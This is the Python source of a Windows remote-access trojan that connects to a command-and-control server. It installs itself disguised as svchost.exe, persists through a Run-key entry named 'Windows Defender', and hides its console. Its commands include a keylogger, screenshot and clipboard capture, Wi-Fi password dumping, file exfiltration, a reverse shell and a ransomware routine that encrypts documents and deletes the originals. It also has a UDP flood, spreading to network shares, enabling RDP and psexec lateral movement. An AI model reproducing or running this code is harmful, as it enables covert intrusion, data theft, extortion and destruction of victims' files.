import socket
import os
import subprocess
import sys
import threading
import time
import base64
import json
import shutil
import winreg
import ctypes
import platform
import psutil
import requests
import zipfile
import tempfile
from datetime import datetime
import pyautogui
import pyperclip
import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wav
import cv2
from cryptography.fernet import Fernet
import getpass
import wifi
import netifaces
from scapy.all import ARP, Ether, srp
import struct
import urllib.request

# ========== CONFIGURATION ==========
C2_SERVER = "192.168.0.250"
C2_PORT = 6767
BEACON_INTERVAL = 60
VERSION = "2.0"
INSTALL_PATH = os.path.join(os.getenv('APPDATA'), 'Windows', 'System32', 'svchost.exe')
KEY = Fernet.generate_key()
cipher = Fernet(KEY)

# ========== INSTALLATION & PERSISTENCE ==========
def install():
    if not os.path.exists(INSTALL_PATH):
        shutil.copy2(sys.argv[0], INSTALL_PATH)
    
    # Hide file
    try:
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_PATH, 2)
    except:
        pass
    
    # Registry persistence
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Windows Defender", 0, winreg.REG_SZ, INSTALL_PATH)
        key.Close()
    except:
        pass
    
    # Add to services
    try:
        with open(os.path.join(os.getenv('WINDIR'), 'system32', 'drivers', 'etc', 'hosts'), 'a') as f:
            f.write("\n# Microsoft Update Service\n")
    except:
        pass

# ========== COMMAND HANDLERS ==========
def execute_command(cmd):
    try:
        cmd_lower = cmd.lower().strip()
        
        # CORE SYSTEM CONTROL
        if cmd_lower == "systeminfo":
            info = f"""
Hostname: {platform.node()}
OS: {platform.system()} {platform.version()}
Architecture: {platform.machine()}
Processor: {platform.processor()}
RAM: {psutil.virtual_memory().total / (1024**3):.2f} GB
Current User: {getpass.getuser()}
Uptime: {time.time() - psutil.boot_time():.0f} seconds
            """
            return info
            
        elif cmd_lower.startswith("ps") or cmd_lower.startswith("listprocesses"):
            procs = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    procs.append(f"{proc.info['pid']}: {proc.info['name']} ({proc.info['username']})")
                except:
                    pass
            return "\n".join(procs[:50])
            
        elif cmd_lower.startswith("kill "):
            pid = int(cmd.split()[1])
            os.kill(pid, 9)
            return f"Killed process {pid}"
            
        elif cmd_lower.startswith("start "):
            app = cmd[6:]
            subprocess.Popen(app, shell=True)
            return f"Started {app}"
            
        elif cmd_lower in ["shutdown", "reboot"]:
            subprocess.run(f"shutdown /{'r' if 'reboot' in cmd_lower else 's'} /t 0", shell=True)
            return f"System will {cmd_lower}"
        
        # FILE SYSTEM OPERATIONS
        elif cmd_lower.startswith("cd "):
            os.chdir(cmd[3:])
            return f"Changed to {os.getcwd()}"
            
        elif cmd_lower in ["dir", "ls"]:
            return "\n".join(os.listdir('.'))
            
        elif cmd_lower.startswith("upload "):
            # File upload handled by server
            return "Ready for upload"
            
        elif cmd_lower.startswith("download "):
            filepath = cmd[9:]
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            return "File not found"
            
        elif cmd_lower.startswith("delete ") or cmd_lower.startswith("del "):
            target = cmd.split()[1]
            if os.path.exists(target):
                os.remove(target)
                return f"Deleted {target}"
            return "File not found"
            
        elif cmd_lower.startswith("mkdir "):
            os.makedirs(cmd[6:], exist_ok=True)
            return f"Created directory {cmd[6:]}"
            
        elif cmd_lower.startswith("search "):
            pattern = cmd[7:]
            results = []
            for root, dirs, files in os.walk('.'):
                for file in files:
                    if pattern in file:
                        results.append(os.path.join(root, file))
            return "\n".join(results[:20])
            
        elif cmd_lower.startswith("encrypt "):
            filepath = cmd[8:]
            with open(filepath, 'rb') as f:
                encrypted = cipher.encrypt(f.read())
            with open(filepath + '.enc', 'wb') as f:
                f.write(encrypted)
            os.remove(filepath)
            return f"Encrypted {filepath}"
            
        elif cmd_lower.startswith("decrypt "):
            filepath = cmd[8:]
            with open(filepath, 'rb') as f:
                decrypted = cipher.decrypt(f.read())
            with open(filepath.replace('.enc', ''), 'wb') as f:
                f.write(decrypted)
            os.remove(filepath)
            return f"Decrypted {filepath}"
        
        # NETWORK COMMANDS
        elif cmd_lower == "netstat":
            connections = []
            for conn in psutil.net_connections():
                if conn.laddr:
                    connections.append(f"{conn.laddr.ip}:{conn.laddr.port} -> {conn.raddr.ip if conn.raddr else 'LOCAL'}")
            return "\n".join(connections)
            
        elif cmd_lower.startswith("portscan "):
            target = cmd.split()[1]
            open_ports = []
            for port in range(1, 1025):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                if sock.connect_ex((target, port)) == 0:
                    open_ports.append(str(port))
                sock.close()
            return f"Open ports on {target}: {', '.join(open_ports)}"
            
        elif cmd_lower in ["ifconfig", "ipconfig"]:
            interfaces = []
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        interfaces.append(f"{iface}: {addr['addr']}")
            return "\n".join(interfaces)
            
        elif cmd_lower == "routerpass":
            # Try to get router credentials
            try:
                output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
                profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]
                passwords = []
                for profile in profiles[:5]:
                    try:
                        result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True, text=True)
                        for line in result.split('\n'):
                            if "Key Content" in line:
                                passwords.append(f"{profile}: {line.split(':')[1].strip()}")
                    except:
                        pass
                return "\n".join(passwords) if passwords else "No passwords found"
            except:
                return "Failed to get router passwords"
                
        elif cmd_lower == "wifi list":
            networks = []
            try:
                for cell in wifi.Cell.all('wlan0'):
                    networks.append(f"{cell.ssid} ({cell.signal})")
                return "\n".join(networks)
            except:
                return "No WiFi interfaces found"
        
        # SURVEILLANCE COMMANDS
        elif cmd_lower == "keylogger start":
            global keylogger_active
            keylogger_active = True
            threading.Thread(target=keylogger).start()
            return "Keylogger started"
            
        elif cmd_lower == "keylogger stop":
            keylogger_active = False
            return "Keylogger stopped"
            
        elif cmd_lower == "screenshot":
            screenshot = pyautogui.screenshot()
            screenshot.save('temp_screen.png')
            with open('temp_screen.png', 'rb') as f:
                return base64.b64encode(f.read()).decode()
            os.remove('temp_screen.png')
            
        elif cmd_lower == "clipboard get":
            return pyperclip.paste()
            
        elif cmd_lower == "browser history":
            # Basic browser history extraction
            browsers = []
            try:
                # Chrome
                chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 
                                         'Google', 'Chrome', 'User Data', 'Default', 'History')
                if os.path.exists(chrome_path):
                    browsers.append("Chrome history available")
            except:
                pass
            return "\n".join(browsers) if browsers else "No browser history found"
        
        # PRIVILEGE ESCALATION
        elif cmd_lower == "getsystem":
            try:
                # Simple privilege escalation attempt
                if ctypes.windll.shell32.IsUserAnAdmin():
                    return "Already running as admin"
                else:
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
                    return "Attempting privilege escalation"
            except:
                return "Privilege escalation failed"
                
        elif cmd_lower == "passdump":
            # Try to dump passwords from system
            try:
                output = subprocess.check_output("net user", shell=True, text=True)
                return output
            except:
                return "Failed to dump passwords"
        
        # LATERAL MOVEMENT
        elif cmd_lower.startswith("psexec "):
            parts = cmd.split()
            if len(parts) >= 3:
                target = parts[1]
                command = " ".join(parts[2:])
                try:
                    result = subprocess.check_output(f'psexec \\\\{target} {command}', shell=True, text=True)
                    return result
                except:
                    return "PsExec failed"
            return "Usage: psexec [target] [command]"
            
        elif cmd_lower == "rdp enable":
            try:
                subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f', shell=True)
                subprocess.run('netsh advfirewall firewall set rule group="remote desktop" new enable=Yes', shell=True)
                return "RDP enabled"
            except:
                return "Failed to enable RDP"
                
        elif cmd_lower == "spread":
            # Spread to network shares
            try:
                shares = []
                result = subprocess.check_output("net view", shell=True, text=True)
                for line in result.split('\n'):
                    if '\\\\' in line:
                        share = line.strip().split()[0]
                        shares.append(share)
                
                for share in shares[:3]:
                    try:
                        dest = f'{share}\\C$\\Windows\\Temp\\svchost.exe'
                        shutil.copy2(sys.argv[0], dest)
                    except:
                        pass
                return f"Attempted to spread to {len(shares)} shares"
            except:
                return "Spread failed"
        
        # DATA EXFILTRATION
        elif cmd_lower.startswith("exfil "):
            filepath = cmd[6:]
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    data = base64.b64encode(f.read()).decode()
                return f"EXFIL:{os.path.basename(filepath)}|{data}"
            return "File not found"
            
        elif cmd_lower.startswith("compress "):
            import zipfile
            files = cmd[9:].split()
            with zipfile.ZipFile('compressed.zip', 'w') as zipf:
                for file in files:
                    if os.path.exists(file):
                        zipf.write(file)
            return "Compressed to compressed.zip"
        
        # ADVANCED FEATURES
        elif cmd_lower.startswith("reverse "):
            parts = cmd.split()
            if len(parts) >= 3:
                ip = parts[1]
                port = int(parts[2])
                threading.Thread(target=reverse_shell, args=(ip, port)).start()
                return f"Reverse shell to {ip}:{port} started"
                
        elif cmd_lower.startswith("ransomware "):
            directory = cmd[11:]
            count = 0
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.endswith(('.txt', '.doc', '.pdf', '.jpg')):
                        try:
                            filepath = os.path.join(root, file)
                            with open(filepath, 'rb') as f:
                                encrypted = cipher.encrypt(f.read())
                            with open(filepath + '.encrypted', 'wb') as f:
                                f.write(encrypted)
                            os.remove(filepath)
                            count += 1
                        except:
                            pass
            return f"Encrypted {count} files"
            
        elif cmd_lower == "miner start":
            threading.Thread(target=crypto_miner).start()
            return "Crypto miner started"
            
        elif cmd_lower == "miner stop":
            global miner_active
            miner_active = False
            return "Crypto miner stopped"
            
        elif cmd_lower.startswith("ddos "):
            parts = cmd.split()
            if len(parts) >= 3:
                target = parts[1]
                port = int(parts[2])
                threading.Thread(target=ddos_attack, args=(target, port)).start()
                return f"DDoS attack on {target}:{port} started"
        
        # C2 MANAGEMENT
        elif cmd_lower.startswith("beacon "):
            global BEACON_INTERVAL
            BEACON_INTERVAL = int(cmd.split()[1])
            return f"Beacon interval set to {BEACON_INTERVAL}s"
            
        elif cmd_lower.startswith("update "):
            url = cmd[7:]
            try:
                response = requests.get(url)
                with open(sys.argv[0], 'wb') as f:
                    f.write(response.content)
                return "Update successful, restarting..."
            except:
                return "Update failed"
                
        elif cmd_lower == "uninstall":
            try:
                os.remove(INSTALL_PATH)
                # Remove registry entry
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                    r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                    0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "Windows Defender")
                key.Close()
                return "Uninstalled, exiting..."
            except:
                return "Uninstall failed"
                
        elif cmd_lower.startswith("sleep "):
            seconds = int(cmd.split()[1])
            time.sleep(seconds)
            return f"Slept for {seconds} seconds"
            
        elif cmd_lower == "reconnect":
            return "RECONNECT"
        
        # Default command execution
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
            
    except Exception as e:
        return f"Error: {str(e)}"

# ========== SURVEILLANCE FUNCTIONS ==========
keylogger_active = False
def keylogger():
    from pynput import keyboard
    def on_press(key):
        if keylogger_active:
            try:
                with open("keylog.txt", "a") as f:
                    f.write(str(key) + "\n")
            except:
                pass
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ========== ADVANCED FEATURE FUNCTIONS ==========
def reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b"Reverse shell connected\n")
        while True:
            s.send(b"Shell> ")
            cmd = s.recv(1024).decode().strip()
            if cmd == "exit":
                break
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            s.send(result.stdout.encode() + result.stderr.encode())
        s.close()
    except:
        pass

miner_active = False
def crypto_miner():
    global miner_active
    miner_active = True
    # Simple CPU stress test (placeholder for actual miner)
    while miner_active:
        for _ in range(1000000):
            _ = 1 + 1
        time.sleep(0.1)

def ddos_attack(target, port):
    import random
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    for _ in range(10000):
        sock.sendto(bytes, (target, port))
    sock.close()

# ========== MAIN C2 CONNECTION ==========
def connect_to_c2():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_SERVER, C2_PORT))
            s.settimeout(30)
            
            # Main command loop
            while True:
                try:
                    # Send beacon
                    s.send(b"BEACON")
                    
                    # Check for commands
                    data = s.recv(65536).decode('utf-8', errors='ignore')
                    if not data:
                        break
                    
                    if data.startswith("CMD:"):
                        command = data[4:]
                        if command == "systeminfo":
                            # Special case for initial info
                            info = execute_command("systeminfo")
                            s.send(f"OUTPUT:{info}".encode())
                        else:
                            result = execute_command(command)
                            if result.startswith("EXFIL:"):
                                s.send(f"FILEDATA:{result[6:]}".encode())
                            elif result == "RECONNECT":
                                s.close()
                                time.sleep(5)
                                return
                            else:
                                s.send(f"OUTPUT:{result}".encode())
                    elif data.startswith("BROADCAST:"):
                        command = data[10:]
                        result = execute_command(command)
                        # Don't send broadcast results back
                
                except socket.timeout:
                    continue
                except:
                    break
                    
            s.close()
            
        except:
            pass
        
        # Reconnect after delay
        time.sleep(BEACON_INTERVAL)

# ========== MAIN ==========
if __name__ == "__main__":
    # Install on first run
    if not os.path.exists(INSTALL_PATH):
        install()
    
    # Hide console window
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    # Start C2 connection
    connect_to_c2()
